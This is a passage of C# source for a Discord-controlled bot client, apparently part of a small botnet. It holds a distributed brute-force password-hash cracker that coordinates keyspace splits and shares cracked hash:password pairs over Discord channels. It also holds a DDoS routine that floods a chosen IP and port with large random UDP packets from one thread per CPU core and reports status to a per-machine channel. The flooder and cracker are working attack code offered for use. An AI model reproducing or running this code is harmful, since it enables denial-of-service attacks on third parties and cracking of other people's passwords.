                    FoundCorrectPass = true;
                    elsesPassword = lastMessage.Content.Substring(17);
                    elsesHash = lastMessage.Content.Substring(0, 64);
                    Log(new LogMessage(LogSeverity.Info, "Discord", $"Other bot found password: {lastMessage.Content}"));
                    Log(new LogMessage(LogSeverity.Info, "Discord", $"DEBUG: {elsesHash}:{elsesPassword}"));
                    // Send discord message
                    var guild2 = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();
                    var channel2 = guild2.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                    await channel2.SendMessageAsync($"Other bot found password: {lastMessage.Content}");
                    // Stop cracking
                    btnStopCracking_Click(null, null);
                }
                else if (timeDifference > 30 && timeDifference < 60)
                {
                    currentWarningLevel = 1;
                }
                else if (timeDifference > 60 && timeDifference < 90)
                {
                    currentWarningLevel = 2;
                }
                else if (timeDifference > 90)
                {
                    currentWarningLevel = 3;
                    // The channel has not sent a heartbeat in the last 30 seconds
                    Log(new LogMessage(LogSeverity.Error, "Discord", $"No heartbeat found in {channel.Name}. Will now remove the channel and possible bot"));

                    // Delete channel
                    // Check if channel is the same as this computer
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();
                    if (channel.Name == $"bot-{computerName}")
                    {
                        // The channel is the same as this computer
                        // Do not delete the channel
                        Log(new LogMessage(LogSeverity.Error, "Discord", $"Channel is the same as this computer. Will not delete the channel."));
                    }
                    else
                    {
                        // The channel is not the same as this computer
                        // Delete the channel
                        await channel.DeleteAsync();
                    }
                    // Reset warning level
                    currentWarningLevel = 0;
                }
                else
                {
                    foreach (var message in messages)
                    {
                        if (message.Content.StartsWith("Password found!"))
                        {
                            // The other bot has found the password
                            // Stop cracking
                            FoundCorrectPass = true;
                            elsesPassword = lastMessage.Content.Substring(17);
                            elsesHash = lastMessage.Content.Substring(0, 64);
                            Log(new LogMessage(LogSeverity.Info, "Discord", $"Other bot found password: {lastMessage.Content}"));
                            Log(new LogMessage(LogSeverity.Info, "Discord", $"DEBUG: {elsesHash}:{elsesPassword}"));
                            // Send discord message
                            var guild2 = _client.Guilds.FirstOrDefault(); // Get the first available guild
                            string computerNameRaw = Environment.MachineName;
                            string computerName = computerNameRaw.ToLower();
                            var channel2 = guild2.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                            await channel2.SendMessageAsync($"Other bot found password: {lastMessage.Content}");
                            // Stop cracking
                            btnStopCracking_Click(null, null);
                        }
                    }
                }
            }
        }



        // get status
        private string GetStatus()
        {
            // Variables
            BigInteger hashesPerSecondInt = 0;
            BigInteger hashesPerSecond = 0;
            string currentGuess = "";
            string timeStarted = "";
            string timeStopped = "";
            TimeSpan timeElapsed = new TimeSpan();
            BigInteger estimatedTimeRemaining = 0;
            string formattedTimeRemaining = "";
            string formattedTimeElapsed = "";
            BigInteger possibleCombinations = 0;
            bool UsesForcesSS = false;

            // Calculate possible combinations
            try
            {
                // Calculate possible combinations
                possibleCombinations = CalculateCombinations(UseNumbers, UseLetters, UseSymbols, UseCapitals, MaxLength, MinLength);
            }
            catch (Exception ex)
            {
                // Log error
                Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating possible combinations: {ex.Message}"));
            }

            // Calculate hashes per second (Phase 1)
            try
            {
                // Calculate hashes per second
                hashesPerSecond = AccualCount / new BigInteger(stopwatch.Elapsed.TotalSeconds);
                hashesPerSecondInt = (int)hashesPerSecond;
            }
            catch (Exception ex)
            {
                // Log error
                Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating hashes per second (Phase 1): {ex.Message}"));
            }

            // Calculate estimated time remaining
            try
            {
                // Calculate estimated time remaining
                estimatedTimeRemaining = possibleCombinations / hashesPerSecond;
                Log(new LogMessage(LogSeverity.Info, "Info", $"Estimated time remaining (in seconds): {estimatedTimeRemaining}"));

                // Ensure estimatedTimeRemaining is non-negative
                if (estimatedTimeRemaining < 0)
                {
                    estimatedTimeRemaining = 0;
                }

                // Calculate days, hours, minutes, seconds, and milliseconds
                BigInteger totalSeconds = (BigInteger)estimatedTimeRemaining;

                BigInteger days = totalSeconds / (24 * 3600);
                BigInteger remainingSeconds = totalSeconds % (24 * 3600);
                BigInteger hours = remainingSeconds / 3600;
                BigInteger remainingMinutes = remainingSeconds % 3600;
                BigInteger minutes = remainingMinutes / 60;
                BigInteger seconds = remainingMinutes % 60;
                BigInteger milliseconds = (estimatedTimeRemaining % 1000);

                Log(new LogMessage(LogSeverity.Info, "Info", $"Estimated time remaining: {days}D:{hours}H:{minutes}M:{seconds}S:{milliseconds}F"));

                // Format the time remaining
                formattedTimeRemaining = $"{days:D3}D:{hours:D2}H:{minutes:D2}M:{seconds:D2}S:{milliseconds:D3}F";
            }
            catch (Exception ex)
            {
                // Log error
                Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating estimated time remaining: {ex.Message}"));
            }

            // Calculate current guess
            try
            {
                if (counter == 0)
                {
                    currentGuess = "None";
                }
                else
                {
                    currentGuess = GeneratePasswords(MinLength, MaxLength, UseLetters, UseNumbers, UseCapitals, UseSymbols).ElementAt(counter - 1);
                }
            }
            catch (Exception ex)
            {
                // Log error
                Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating current guess: {ex.Message}"));
            }

            // Calculate time started
            try
            {
                // Take the current time - the time elapsed
                timeStarted = DateTime.Now.Subtract(stopwatch.Elapsed).ToString();
            }
            catch (Exception ex)
            {
                // Log error
                Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating time started: {ex.Message}"));
            }

            // Calculate time stopped
            try
            {
                try
                {
                    // Date time done
                    DateTimeOffset baseDateTimeOffset = DateTimeOffset.UtcNow;

                    // Calculate timeDoneOffset using BigInteger directly
                    BigInteger remainingTicks = BigInteger.Multiply((BigInteger)estimatedTimeRemaining, (BigInteger)TimeSpan.TicksPerSecond);
                    DateTimeOffset timeDoneOffset = baseDateTimeOffset.AddTicks((long)remainingTicks);

                    timeStopped = timeDoneOffset.ToString();
                    Log(new LogMessage(LogSeverity.Info, "Info", $"Estimated Hash Done: {timeStopped}"));
                }
                catch (Exception ex)
                {
                    // Log error
                    Log(new LogMessage(LogSeverity.Error, "Info", $"Error calculating estimated hash cracked: {ex.Message}"));
                    timeStopped = "A long time ago in a galaxy far, far away....";
                }
            }
            catch (Exception ex)
            {
                // Log error
                Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating time stopped: {ex.Message}"));
            }

            // Calculate time elapsed
            try
            {
                // Convert timeElapsed to a string that looks like this: 000D:00H:00M:00S:000F
                timeElapsed = stopwatch.Elapsed;

                // Calculate days, hours, minutes, seconds, and milliseconds
                BigInteger totalSeconds = (BigInteger)timeElapsed.TotalSeconds;
                BigInteger days = totalSeconds / (24 * 3600);
                BigInteger hours = totalSeconds / 3600;
                BigInteger remainingMinutes = totalSeconds % 3600;
                BigInteger minutes = remainingMinutes / 60;
                BigInteger seconds = remainingMinutes % 60;
                BigInteger milliseconds = (estimatedTimeRemaining % 1000);

                // Format the time
                formattedTimeElapsed = $"{days:D3}D:{hours:D2}H:{minutes:D2}M:{seconds:D2}S:{milliseconds:D3}F";

            }
            catch (Exception ex)
            {
                // Log error
                Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating time elapsed: {ex.Message}"));
            }

            // Create status string
            string status = "";
            try
            {
                status += $"**------------------ Settings ------------------**\r\n"; 
                status += $"Password found: **{FoundCorrectPass}** \r\n";
                if (Algorithm != null)
                    status += $"Algorithm: **{Algorithm}** \r\n";
                else
                    status += $"Algorithm: **NULL** \r\n";
                if (hash != null)
                    status += $"Hash: **{hash}** \r\n";
                else
                    status += $"Hash: **NULL** \r\n";
                status += $"\r\n";
                if (txtGuessedPassword.Text != null || txtGuessedPassword.Text != "")
                    status += $"Current Hash Guess: **{txtGuessedPassword.Text}** \r\n";
                else
                    status += $"Current Hash Guess: **NULL** \r\n";
                if (currentGuess != null)
                    status += $"Current Password Guess: **{currentGuess}**\r\n";
                else
                    status += $"Current Password Guess: **NULL**\r\n";
                status += $"\r\n**------------------ Attempts ------------------**\r\n";
                if (AccualCount != null)
                    status += $"Attempts: **{AccualCount}** \r\n";
                else
                    status += $"Attempts: **NULL** \r\n";
                if (possibleCombinations != null)
                    status += $"Possible Combinations: **{possibleCombinations}** \r\n";
                else
                    status += $"Possible Combinations: **NULL** \r\n";
                if (counter != null || possibleCombinations != null)
                    status += $"Total Attemps: **{counter}/{possibleCombinations}** \r\n";
                else
                    status += $"Total Attemps: **NULL** \r\n";
                status += $"\r\n**------------------ Time ------------------**\r\n";
                if (timeStarted != null)
                    status += $"Time started: **{timeStarted}** \r\n";
                else 
                    status += $"Time started: **NULL** \r\n";
                if (timeStopped != null)
                    status += $"Time stopped: **{timeStopped}** (Estimated...)\r\n";
                else
                    status += $"Time stopped: **NULL** (Estimated...)\r\n";
                status += $"\r\n";
                if (hashesPerSecondInt != null)
                    status += $"Hashes per second: **{hashesPerSecondInt}**\r\n";
                else
                    status += $"Hashes per second: **NULL**\r\n";
                if (formattedTimeElapsed != null)
                    status += $"Time elapsed: **{formattedTimeElapsed}** \r\n";
                else 
                    status += $"Time elapsed: **NULL** \r\n";
                if (formattedTimeRemaining != null)
                    status += $"Estimated time remaining: **{formattedTimeRemaining}** \r\n";
                else 
                    status += $"Estimated time remaining: **NULL** \r\n";
                status += $"\r\n**------------------ Misc ------------------**\r\n";
                if (forcesSS != null)
                    status += $"ForcesSS: **{forcesSS}** \r\n";
                else 
                    status += $"ForcesSS: **NULL** \r\n";
            }
            catch (Exception ex)
            {
                // Log error
                Log(new LogMessage(LogSeverity.Error, "Status", $"Error creating status string: {ex.Message}"));
            }
            return status;
        }
        private string GetInfo()
        {
            // Calculate estimated time remaining by dividing the number of combinations by the hashes per second
            BigInteger possibleCombinations = CalculateCombinations(UseNumbers, UseLetters, UseSymbols, UseCapitals, MaxLength, MinLength);
            Log(new LogMessage(LogSeverity.Info, "Info", $"Possible combinations: {possibleCombinations}"));

            // Calculate hashes per second
            double hashesPerSecond = 4000;

            // Calculate estimated time remaining
            double estimatedTimeRemaining = (double)possibleCombinations / hashesPerSecond;
            Log(new LogMessage(LogSeverity.Info, "Info", $"Estimated time remaining (in seconds): {estimatedTimeRemaining}"));

            // Ensure estimatedTimeRemaining is non-negative
            estimatedTimeRemaining = Math.Max(estimatedTimeRemaining, 0);

            // Calculate days, hours, minutes, seconds, and milliseconds
            BigInteger totalSeconds = (BigInteger)estimatedTimeRemaining;
            
            BigInteger days = totalSeconds / (24 * 3600);
            BigInteger remainingSeconds = totalSeconds % (24 * 3600);
            BigInteger hours = remainingSeconds / 3600;
            BigInteger remainingMinutes = remainingSeconds % 3600;
            BigInteger minutes = remainingMinutes / 60;
            BigInteger seconds = remainingMinutes % 60;
            BigInteger milliseconds = (BigInteger)((estimatedTimeRemaining - Math.Floor(estimatedTimeRemaining)) * 1000);

            Log(new LogMessage(LogSeverity.Info, "Info", $"Estimated time remaining: {days}D:{hours}H:{minutes}M:{seconds}S:{milliseconds}F"));

            // Format the time remaining
            string formattedTimeRemaining = $"{days:D3}D:{hours:D2}H:{minutes:D2}M:{seconds:D2}S:{milliseconds:D3}F";

            string timeDone = "";
            try
            {
                // Date time done
                DateTimeOffset baseDateTimeOffset = DateTimeOffset.UtcNow;

                // Calculate timeDoneOffset using BigInteger directly
                BigInteger remainingTicks = BigInteger.Multiply((BigInteger)estimatedTimeRemaining, (BigInteger)TimeSpan.TicksPerSecond);
                DateTimeOffset timeDoneOffset = baseDateTimeOffset.AddTicks((long)remainingTicks);

                timeDone = timeDoneOffset.ToString();
                Log(new LogMessage(LogSeverity.Info, "Info", $"Estimated Hash Cracked: {timeDone}"));
            }
            catch (Exception ex)
            {
                // Log error
                Log(new LogMessage(LogSeverity.Error, "Info", $"Error calculating estimated hash cracked: {ex.Message}"));
                timeDone = "A long time ago in a galaxy far, far away....";
            }

            string info = "";
            if (hash != null)
            {
                info += $"Hash: **{hash}** \r\n";
            }
            else
            {
                info += $"Hash: **NULL** \r\n";
            }
            info += $"Algorithm: **{Algorithm}** \r\n";
            info += $"UseNumbers: **{UseNumbers}** \r\n";
            info += $"UseLetters: **{UseLetters}** \r\n";
            info += $"UseSymbols: **{UseSymbols}** \r\n";
            info += $"UseCapitals: **{UseCapitals}** \r\n";
            info += $"Max length: **{MaxLength}** \r\n";
            info += $"Min length: **{MinLength}** \r\n";
            info += $"Possible combinations: **{possibleCombinations}** \r\n";
            info += $"Estimated time remaining: **{formattedTimeRemaining}** (Assuming hashPerSecond is around {hashesPerSecond}) \r\n";
            info += $"Estimated hash done: **{timeDone}** \r\n";
            return info;
        }


        // Form
        public void PassToHash(string pass)
        {
            string hash = "";

            byte[] data = Encoding.ASCII.GetBytes(pass);
            if (Algorithm == "SHA256")
            {
                data = new SHA256Managed().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "SHA512")
            {
                data = new SHA512Managed().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "MD5")
            {
                data = new MD5CryptoServiceProvider().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "SHA1")
            {
                data = new SHA1Managed().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "SHA384")
            {
                data = new SHA384Managed().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "HMACSHA256")
            {
                data = new HMACSHA256().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "HMACSHA512")
            {
                data = new HMACSHA512().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }
            else if (Algorithm == "HMACMD5")
            {
                data = new HMACMD5().ComputeHash(data);
                foreach (byte b in data)
                {
                    hash += b.ToString("x2");
                }
            }

            // Debug
            if (DebugMode)
            {
                txtOutput.AppendText("Attempt #" + counter + ": " + pass + "\r\n");
                //txtOutput.AppendText("Hashed password: " + hash + "\r\n");
            }

            txtGuessedPassword.Text = hash;
        }


        // Cracking
        private async void btnStartCracking_Click(object sender, EventArgs e)
        {
            await Task.Run(() => StartCrackingAsync());
        }

        private async Task StartCrackingAsync()
        {
            Log(new LogMessage(LogSeverity.Info, "Cracking", "Cracking started..."));
            string finalPassword = "";
            FoundCorrectPass = false;
            EmergencySTOP = false;

            // Variables
            string computerNameRaw = "";
            string computerName = "";

            // Search for channel "hash" in the same guild and look though all messages
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"hash");
            var messages = channel.GetMessagesAsync(100).FlattenAsync().Result;
            List<IMessage> messageList = messages.ToList();

            // Loop though all messages
            foreach (var message in messageList)
            {
                // Check if the message starts with the target hash
                if (message.Content.StartsWith(txtTargetHash.Text))
                {
                    // The message starts with the target hash
                    // Stop cracking
                    FoundCorrectPass = true;
                    // Split with : and get the password
                    finalPassword = message.Content.Split(":")[1];
                    Log(new LogMessage(LogSeverity.Info, "Cracking", "Password found in storage! (" + txtTargetHash.Text + ":" + finalPassword + ")"));
                    // Send message to channel "bot-<computername>"
                    computerNameRaw = Environment.MachineName;
                    computerName = computerNameRaw.ToLower();
                    var channelBot = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                    await channelBot.SendMessageAsync($"@everyone **Password found in storage!** {txtTargetHash.Text}:{finalPassword}");
                    return;
                }
            }

            // Start stopwatch
            stopwatch.Start();

            foreach (var password in GeneratePasswords(MinLength, MaxLength, UseLetters, UseNumbers, UseCapitals, UseSymbols))
            {
                if (EmergencySTOP)
                {
                    break;
                }

                // Check if the counter is inside of a point, such as 0,100;500,600;800,1000
                bool insideRange = false;
                
                // Convert forcesSS to forceRanges
                List<(int, int)> forceRanges = new List<(int, int)>();
                string[] forceRangesRaw = forcesSS.Split(";");
                try
                {
                    foreach (var forceRangeRaw in forceRangesRaw)
                    {
                        string[] forceRange = forceRangeRaw.Split(",");
                        forceRanges.Add((Convert.ToInt32(forceRange[0]), Convert.ToInt32(forceRange[1])));
                    }
                }
                catch (Exception ex)
                {
                    // Its most likly a out of range exception therefor no need to log... this will happend every time the counter is not inside of a range.
                    //Log(new LogMessage(LogSeverity.Error, "Cracking", $"Error converting forcesSS to forceRanges: {ex.Message}"));
                }

                try
                {
                    // Check if counter is inside of a range
                    foreach (var forceRange in forceRanges)
                    {
                        int forceStart = forceRange.Item1;
                        int forceEnd = forceRange.Item2;
                        if (counter >= forceStart && counter <= forceEnd)
                        {
                            insideRange = true;
                            break;
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Log error
                    Log(new LogMessage(LogSeverity.Error, "Cracking", $"Error checking if counter is inside of a range: {ex.Message}"));
                }

                counter++;
                if (!insideRange)
                {
                    continue;
                }

                PassToHash(password);
                AccualCount++;

                // Check if found password is the target password
                if (txtGuessedPassword.Text == txtTargetHash.Text)
                {
                    stopwatch.Stop();
                    FoundCorrectPass = true;
                    finalPassword = password;
                    Log(new LogMessage(LogSeverity.Info, "Cracking", "Password found! (" + txtGuessedPassword.Text + ":" + finalPassword + ")"));
                    // Log how much time it took
                    TimeSpan time = TimeSpan.FromMilliseconds(stopwatch.Elapsed.TotalSeconds);
                    Log(new LogMessage(LogSeverity.Info, "Cracking", "It only took " + time.ToString(@"hh\:mm\:ss\:fff") + " to find the password!"));
                    
                    if (AutoCrack)
                    {
                        // IMPLEMENT: Somehow stop all auto-splitting bots
                    }
                    break;
                }
            }

            stopwatch.Stop();

            // Log
            Log(new LogMessage(LogSeverity.Info, "Cracking", "Cracking stopped."));
            // Send message to discord
            guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            computerNameRaw = Environment.MachineName;
            computerName = computerNameRaw.ToLower();
            channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
            if (FoundCorrectPass)
            {
                try
                {
                    TimeSpan timeElapsed = new TimeSpan();
                    string formattedTimeElapsed = "";

                    // Calculate time elapsed
                    try
                    {
                        // Convert timeElapsed to a string that looks like this: 000D:00H:00M:00S:000F
                        timeElapsed = stopwatch.Elapsed;

                        // Calculate days, hours, minutes, seconds, and milliseconds
                        BigInteger totalSeconds = (BigInteger)timeElapsed.TotalSeconds;
                        BigInteger days = totalSeconds / (24 * 3600);
                        BigInteger hours = totalSeconds / 3600;
                        BigInteger remainingMinutes = totalSeconds % 3600;
                        BigInteger minutes = remainingMinutes / 60;
                        BigInteger seconds = remainingMinutes % 60;
                        BigInteger milliseconds = (BigInteger)((stopwatch.Elapsed.TotalMilliseconds - Math.Floor(stopwatch.Elapsed.TotalMilliseconds)) * 1000);

                        // Format the time
                        formattedTimeElapsed = $"{days:D3}D:{hours:D2}H:{minutes:D2}M:{seconds:D2}S:{milliseconds:D3}F";

                    }
                    catch (Exception ex)
                    {
                        // Log error
                        Log(new LogMessage(LogSeverity.Error, "Status", $"Error calculating time elapsed: {ex.Message}"));
                    }

                    await channel.SendMessageAsync($"@everyone **Password found! It only took {formattedTimeElapsed} to find the password!** (Used forcesSS: {forcesSS})");
                    await channel.SendMessageAsync($"{txtGuessedPassword.Text}:{finalPassword}");

                    // Activate function to send hash and password to discord channel "hash" in the same guild
                    // Send message to discord
                    var guild2 = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    var channel2 = guild2.TextChannels.FirstOrDefault(ch => ch.Name == $"hash");
                    await channel2.SendMessageAsync($"{txtGuessedPassword.Text}:{finalPassword}");
                }
                catch (Exception ex)
                {
                    // Log error
                    Log(new LogMessage(LogSeverity.Error, "Cracking", $"Error sending message to discord: {ex.Message}"));
                    // Send message to discord
                    await channel.SendMessageAsync($"@everyone **Password found! {txtGuessedPassword.Text}:{finalPassword}**");
                }
            }
            else
            {
                await channel.SendMessageAsync($"Password NOT found! {txtGuessedPassword.Text}:{finalPassword}");

                // Find channel "forces" in the same guild and look though all messages
                var guild3 = _client.Guilds.FirstOrDefault(); // Get the first available guild
                var channel3 = guild3.TextChannels.FirstOrDefault(ch => ch.Name == $"forces");

                // Send message to discord (<hash>:<algorithm>:<useNumbers>:<useLetters>:<useSymbols>:<useCapitals>:<Max>:<Min>:<combinations>:<forceStart>:<forceEnd>)
                await channel3.SendMessageAsync($"{txtTargetHash.Text}:{Algorithm}:{UseNumbers}:{UseLetters}:{UseSymbols}:{UseCapitals}:{MaxLength}:{MinLength}:{globalCombinations}:{forcesSS}");

                // Log that message was sent
                Log(new LogMessage(LogSeverity.Info, "Cracking", $"Done with cracking and password was not found, therefor I sent a forces argument to all other bots."));

                if (AutoCrack)
                {
                    // Remove current split from splits channel by looking at last message and then removing current split from message and then send it back
                    var guild4 = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    var channel4 = guild4.TextChannels.FirstOrDefault(ch => ch.Name == $"splits");
                    var messages4 = channel4.GetMessagesAsync(1).FlattenAsync().Result;
                    List<IMessage> messageList4 = messages4.ToList();

                    // Loop though all messages
                    foreach (var message in messageList4)
                    {
                        // Then removing current split from message and then send it back
                        string messageContent = message.Content;
                        string[] messageContentSplit = messageContent.Split(";");
                        string newMessageContent = "";
                        foreach (var split in messageContentSplit)
                        {
                            if (split != forcesSS)
                            {
                                newMessageContent += split + ";";
                            }
                        }
                        // Remove last ;
                        newMessageContent = newMessageContent.Substring(0, newMessageContent.Length - 1);
                        // Send message back
                        await channel4.SendMessageAsync(newMessageContent);
                        // Log
                        Log(new LogMessage(LogSeverity.Info, "Cracking", $"Removed current split from splits channel and sent it back. (Split: {newMessageContent})"));

                        // Will now updateAutoSplit and then start cracking again
                        // Update the auto settings
                        updateAutoSettings();
                        findAndSelectAutoSplit();
                    }
                }
            }
            // If you want to use the target hash as the final password, you can do this:
            txtDonePassword.Text = finalPassword.ToString();
        }



        // Generate passwords
        public IEnumerable<string> GeneratePasswords(int minLength, int maxLength, bool useLetters, bool useNumbers, bool useCapitals, bool useSymbols)
        {
            var chars = "";
            if (useLetters) chars += "abcdefghijklmnopqrstuvwxyz";
            if (useNumbers) chars += "0123456789";
            if (useCapitals) chars += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            if (useSymbols) chars += "!@#$%^&*()";

            // Calculate the number of combinations
            BigInteger combinations = CalculateCombinations(UseNumbers, UseLetters, UseSymbols, UseCapitals, MaxLength, MinLength);
            Log(new LogMessage(LogSeverity.Info, "Password", "Number of combinations: " + combinations));

            for (int length = minLength; length <= maxLength; length++)
            {
                foreach (var password in GenerateCombinations(chars, length))
                {
                    yield return password;
                }
            }
        }


        private IEnumerable<string> GenerateCombinations(IEnumerable<char> chars, int length)
        {
            if (length == 1) return chars.Select(c => c.ToString());

            return GenerateCombinations(chars, length - 1)
                .SelectMany(str => chars, (str, c) => str + c);
        }

        // Calculate combinations
        static BigInteger CalculateCombinations(bool useNumbers, bool useLetters, bool useSymbols, bool useCapitals, int maxLength, int minLength)
        {
            // Define the number of characters for each type
            int numNumbers = useNumbers ? 10 : 0; // 0-9
            int numLetters = useLetters ? 26 : 0; // a-z
            int numSymbols = useSymbols ? 32 : 0; // You can adjust this based on the symbols you want to include
            int numCapitals = useCapitals ? 26 : 0; // A-Z

            // Calculate the total number of characters
            int totalCharacters = numNumbers + numLetters + numSymbols + numCapitals;

            // Validate the input parameters
            if (minLength < 1 || maxLength < minLength)
            {
                throw new ArgumentException("Invalid length parameters");
            }

            // Calculate the number of combinations
            BigInteger combinations = 0;
            for (int length = minLength; length <= maxLength; length++)
            {
                combinations += BigInteger.Pow(totalCharacters, length);
            }

            // Set the combinations
            globalCombinations = combinations;
            return combinations;
        }






        // DDOS
        private void DDoS(string ip, string port, string time)
        {
            // Check if the ip is valid
            if (IsValidIP(ip))
            {
                // Check if the port is valid
                if (IsValidPort(port))
                {
                    // Check if the time is valid
                    if (IsValidTime(time))
                    {
                        // Start the DDoS attack
                        Log(new LogMessage(LogSeverity.Info, "DDoS", $"Starting DDoS attack on {ip}:{port} for {time} seconds..."));
                        // Send discord message
                        var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        string computerNameRaw = Environment.MachineName;
                        string computerName = computerNameRaw.ToLower();
                        var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                        channel.SendMessageAsync($"Starting DDoS attack on {ip}:{port} for {time} seconds...");
                        Log(new LogMessage(LogSeverity.Info, "DDoS", $"Starting DDoS attack on {ip}:{port} for {time} seconds..."));
                        // Start the DDoS attack
                        DDoSAttack(ip, port, time);
                    }
                    else
                    {
                        // Send discord message
                        var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                        string computerNameRaw = Environment.MachineName;
                        string computerName = computerNameRaw.ToLower();
                        var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                        channel.SendMessageAsync($"Invalid time. Please use a number between 1 and 3600.");
                        Log(new LogMessage(LogSeverity.Info, "DDoS", $"Invalid time. Please use a number between 1 and 3600."));
                    }
                }
                else
                {
                    // Send discord message
                    var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                    string computerNameRaw = Environment.MachineName;
                    string computerName = computerNameRaw.ToLower();
                    var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                    channel.SendMessageAsync($"Invalid port. Please use a number between 1 and 65535.");
                    Log(new LogMessage(LogSeverity.Info, "DDoS", $"Invalid port. Please use a number between 1 and 65535."));
                }
            }
            else
            {
                // Send discord message
                var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
                string computerNameRaw = Environment.MachineName;
                string computerName = computerNameRaw.ToLower();
                var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
                channel.SendMessageAsync($"Invalid IP. Please use a valid IPv4 address.");
                Log(new LogMessage(LogSeverity.Info, "DDoS", $"Invalid IP. Please use a valid IPv4 address."));
            }
        }
        private void StopDDoS()
        {
            // Stop all DDoS attacks
            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Stopping all DDoS attacks..."));
            // Send discord message
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
            channel.SendMessageAsync($"Stopping all DDoS attacks...");
            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Stopping all DDoS attacks..."));
        }
        private bool IsValidIP(string ipAddress)
        {
            IPAddress parsedIpAddress;

            // Try to parse the IP address
            if (IPAddress.TryParse(ipAddress, out parsedIpAddress))
            {
                // Check if the parsed IP address is IPv4 or IPv6
                return parsedIpAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork ||
                       parsedIpAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6;
            }

            return false;
        }
        private bool IsValidPort(string port)
        {
            // Convert string to int
            int portInt = Convert.ToInt32(port);
            // Check if the port number is within the valid range (1 to 65535)
            return portInt >= 1 && portInt <= 65535;
        }
        private bool IsValidTime(string time)
        {
            // Convert string to int
            int timeInt = Convert.ToInt32(time);
            // Check if the time is within the valid range (1 to 3600)
            return timeInt >= 1 && timeInt <= 3600;
        }
        private void DDoSAttack(string ip, string port, string time)
        {
            // Create abunch of threads that send packets to the target ip and port


            // Convert the ip to an IPAddress
            IPAddress ipAddress = IPAddress.Parse(ip);
            // Convert the port to an int
            int portInt = Convert.ToInt32(port);
            // Convert the time to an int
            int timeInt = Convert.ToInt32(time);

            // Create a list of threads
            List<Thread> threads = new List<Thread>();

            // Create a thread for each core
            for (int i = 0; i < Environment.ProcessorCount; i++)
            {
                // Create a thread
                Thread thread = new Thread(() => SendPackets(ipAddress, portInt, timeInt));
                // Add the thread to the list of threads
                threads.Add(thread);
                // Start the thread
                thread.Start();
                Log(new LogMessage(LogSeverity.Info, "DDoS", $"Thread {thread.ManagedThreadId} started."));
            }

            // Wait for all threads to finish
            foreach (var thread in threads)
            {
                thread.Join();
                Log(new LogMessage(LogSeverity.Info, "DDoS", $"Thread {thread.ManagedThreadId} finished."));
            }

            // Send discord message
            var guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
            string computerNameRaw = Environment.MachineName;
            string computerName = computerNameRaw.ToLower();
            var channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computerName}");
            channel.SendMessageAsync($"DDoS attack on {ip}:{port} for {time} seconds has finished.");
            Log(new LogMessage(LogSeverity.Info, "DDoS", $"DDoS attack on {ip}:{port} for {time} seconds has finished."));
        }

        private void SendPackets(IPAddress ipAddress, int port, int time)
        {
            // Create a socket
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            // Create a random number generator
            Random random = new Random();
            // Create a byte array
            byte[] bytes = new byte[65500];

            // Create a stopwatch
            Stopwatch stopwatch = new Stopwatch();
            // Start the stopwatch
            stopwatch.Start();
            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Thread {Thread.CurrentThread.ManagedThreadId} started."));

            // Send packets until the time is up
            while (stopwatch.Elapsed.TotalSeconds < time)
            {
                // Create a random number of bytes
                random.NextBytes(bytes);
                // Send the bytes to the target ip and port
                socket.SendTo(bytes, new IPEndPoint(ipAddress, port));
                txtOutput.AppendText("Sent packet to " + ipAddress + ":" + port + "\r\n");
            }

            // Stop the stopwatch
            stopwatch.Stop();
            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Thread {Thread.CurrentThread.ManagedThreadId} finished."));
        }



        // Form components

